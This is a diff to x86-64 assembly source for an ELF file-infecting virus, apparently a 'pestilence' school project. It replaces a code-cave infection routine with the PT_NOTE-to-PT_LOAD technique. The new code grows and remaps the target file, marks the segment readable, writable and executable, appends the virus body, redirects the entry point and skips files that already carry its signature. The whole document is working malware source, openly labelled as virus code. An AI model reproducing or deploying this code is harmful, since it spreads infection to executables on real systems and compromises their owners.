@@ -5,10 +5,10 @@ section .text
 
 _start:
 		; Fork process => Parent resumes host activity while Child does virus stuff
-		mov rax, SYSCALL_FORK
-		syscall
-		cmp rax, 0
-		jnz jumpToHost
+;		mov rax, SYSCALL_FORK
+;		syscall
+;		cmp rax, 0
+;		jnz jumpToHost
 
 		; Save common registers
 		push rdi
@@ -267,80 +267,102 @@ injectVirus:
 		; Save File Mapping in R8
 		mov r8, rdi
 
+.checkAlreadyInfected:
+		mov rdi, r8
+		mov rsi, VALUE(s_pestilence.file_size)
+		lea rdx, [rel signature]
+		mov rcx, SIGNATURE_SIZE
+		call ft_memmem
+
+		cmp rax, 0
+		jnz .return
+
+.enlargeFile:
+		mov rax, SYSCALL_FTRUNCATE
+		mov rdi, VALUE(s_pestilence.file_fd)
+		mov rsi, VALUE(s_pestilence.file_size)
+		add rsi, PAGE_SIZE
+		syscall
+
+		cmp rax, 0
+		jl .return
+
+.remapFile:
+		mov rax, SYSCALL_MREMAP
+		mov rdi, r8
+		mov rsi, VALUE(s_pestilence.file_size)
+		mov rdx, rsi
+		add rdx, PAGE_SIZE
+		mov r10, 0x1 ; MREMAP_MAYMOVE
+		xor r8, r8
+		syscall
+
+		cmp rax, MMAP_ERROR
+		jae .return
+
+		mov VALUE(s_pestilence.file_data), rax
+		mov r8, rax
+
 .getELFHeadersInfo:
-		mov rdx, qword [rdi + elf64_ehdr.e_entry]
-		movzx rcx, word [rdi + elf64_ehdr.e_phnum]
-		mov rax, qword [rdi + elf64_ehdr.e_phoff]
+		mov rax, r8
+		movzx rcx, word [rax + elf64_ehdr.e_phnum]
+		mov rdi, qword [rax + elf64_ehdr.e_phoff]
 		add rdi, rax
 
-		; RDI is now address of program header,save it in R9
-		mov r9, rdi
-
-.findCodeCave:
+; RDI => Program Header
+.findNoteSegment:
 		; If e_phnum is 0, we checked all the segments
 		cmp rcx, 0
 		jle .return
 
-		; Segment must be PT_LOAD with flags (PF_X | PF_R) on
-		mov rax, SEGMENT_TYPE
-		cmp rax, qword [rdi]
-		jz .checkSpace
+		cmp dword [rdi + elf64_phdr.p_type], PT_NOTE
+		je .editNoteSegment
 
 .nextSegment:
 		add rdi, elf64_phdr_size
 		dec rcx
-		jmp .findCodeCave
+		jmp .findNoteSegment
 
-; Check if code cave is large enough
-.checkSpace:
-		; Get offset of end of segment and save it for later
-		mov rax, qword [rdi + elf64_phdr.p_offset]
-		add rax, qword [rdi + elf64_phdr.p_filesz]
+; RDI => Note Segment Program Header
+.editNoteSegment:
+		mov r9, rdi
+		mov rax, VALUE(s_pestilence.file_size)
 
-		; Save Offset of End of segment in R10
-		mov r10, rax
+		mov dword [rdi + elf64_phdr.p_type], PT_LOAD
+		mov dword [rdi + elf64_phdr.p_flags], 0x7 ; R W E
+		mov qword [rdi + elf64_phdr.p_offset], rax ; End of file
 
-		; Use offset to get address of end of segment
-		lea rdi, [r8 + r10]
-		mov rsi, rdi
+		add rax, 0xc000000
+		mov qword [rdi + elf64_phdr.p_paddr], rax ; Physical and Virtual address somewhere else
+		mov qword [rdi + elf64_phdr.p_vaddr], rax
 
-		; Loop for PAYLOAD_SIZE as long as [rdi] is '\0'
-		xor al, al
-		mov rcx, PAYLOAD_SIZE
-		repz scasb
-		test rcx, rcx
-		jnz .return
+		mov qword [rdi + elf64_phdr.p_filesz], PAGE_SIZE ; Filesz and Memsz => 4096
+		mov qword [rdi + elf64_phdr.p_memsz], PAGE_SIZE
 
-; RSI => address of segment end
-.checkAlreadyInfected:
-		; Look a few byte before segment end to look for an already existing signature
-		mov rax, [rel signature]
-		cmp rax, qword [rsi - (_end - signature)]
-		jz .return
 
-; RSI => address of segment end
+; Copy PAYLOAD_SIZE bytes from _start to segment end
 .injectPayload:
-		; Copy PAYLOAD_SIZE bytes from _start to segment end
-		lea rdi, [rel _start]
-		xchg rdi, rsi
+		mov rdi, r8
+		add rdi, VALUE(s_pestilence.file_size)
+		lea rsi, [rel _start]
 		mov rcx, PAYLOAD_SIZE
 		repnz movsb
 
-; RDI => address of segment end
-.saveEntries:
-		; Edit `payloadEntry` and `hostEntry` variables
-		mov rax, qword [r8 + elf64_ehdr.e_entry]
-		mov qword [rdi - 16], r10
+; R9 => Note segment Program header
+.patchELFHeader:
+		add qword VALUE(s_pestilence.file_size), PAGE_SIZE
+
+		mov rdi, r8
+		add rdi, VALUE(s_pestilence.file_size)
+
+		mov rsi, [r9 + elf64_phdr.p_offset]
+		mov qword [rdi - 16], rsi
+
+		mov rax, [r8 + elf64_ehdr.e_entry]
 		mov qword [rdi - 8], rax
 
-.updateFileHeader:
 		; Edit file entry to payload start
-		mov qword [r8 + elf64_ehdr.e_entry], r10
-
-		; Increase infected segment size to include payload
-		mov rax, PAYLOAD_SIZE
-		add qword [r9 + elf64_phdr.p_filesz], rax
-		add qword [r9 + elf64_phdr.p_memsz], rax
+		mov qword [r8 + elf64_ehdr.e_entry], rsi
 
 .return:
 		pop r10
